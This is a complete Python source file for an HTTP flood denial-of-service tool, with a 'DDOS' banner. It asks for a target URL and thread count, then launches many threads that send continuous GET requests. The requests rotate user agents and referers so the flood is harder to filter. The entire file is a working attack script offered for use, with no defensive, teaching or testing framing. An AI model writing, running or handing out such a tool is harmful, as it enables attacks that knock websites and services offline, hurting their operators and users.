import socket
import threading
import random
import time
import ssl
from urllib.parse import urlparse

class HttpFloodAttack:
    def __init__(self):
        self.target_url = ""
        self.target_ip = ""
        self.target_port = 80
        self.threads = 100
        self.attack_running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X)"
        ]
        self.referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.yahoo.com/",
            "https://www.facebook.com/"
        ]
    
    def parse_url(self, url):
        parsed = urlparse(url)
        self.target_ip = socket.gethostbyname(parsed.hostname)
        self.target_port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
        return parsed.path if parsed.path else '/'
    
    def set_target(self, url):
        self.target_url = url
        self.path = self.parse_url(url)
    
    def set_threads(self, num):
        self.threads = num
    
    def create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        
        if self.target_port == 443:
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=self.target_url)
        
        return s
    
    def send_request(self):
        try:
            s = self.create_socket()
            s.connect((self.target_ip, self.target_port))
            
            user_agent = random.choice(self.user_agents)
            referer = random.choice(self.referers)
            
            headers = [
                f"GET {self.path} HTTP/1.1",
                f"Host: {self.target_url}",
                f"User-Agent: {user_agent}",
                f"Referer: {referer}",
                "Accept: text/html,application/xhtml+xml",
                "Connection: keep-alive",
                "\r\n"
            ]
            
            request = "\r\n".join(headers)
            s.send(request.encode())
            
            # إبقاء الاتصال مفتوحًا لفترة قصيرة
            time.sleep(random.uniform(0.1, 0.3))
            s.close()
            
            print(f"[+] Request sent to {self.target_url}")
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    def attack(self):
        while self.attack_running:
            self.send_request()
    
    def start_attack(self):
        if not self.target_url:
            print("[-] Please set target URL first!")
            return
        
        self.attack_running = True
        print(f"[*] Starting HTTP Flood attack on {self.target_url}")
        print(f"[*] Using {self.threads} threads")
        print("[*] Press Ctrl+C to stop")
        
        for _ in range(self.threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            thread.start()
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        self.attack_running = False
        print("[*] Attack stopped")

def main():
    tool = HttpFloodAttack()
    
    print("""
    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██║  ██║██║   ██║███████╗
    ██║  ██║██║  ██║██║   ██║╚════██║
    ██████╔╝██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    HTTP Flood Tool - Python
    """)
    
    try:
        target_url = input("Enter target URL (e.g., http://example.com): ").strip()
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        threads = int(input("Enter number of threads (default 100): ") or "100")
        
        tool.set_target(target_url)
        tool.set_threads(threads)
        tool.start_attack()
    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    main()
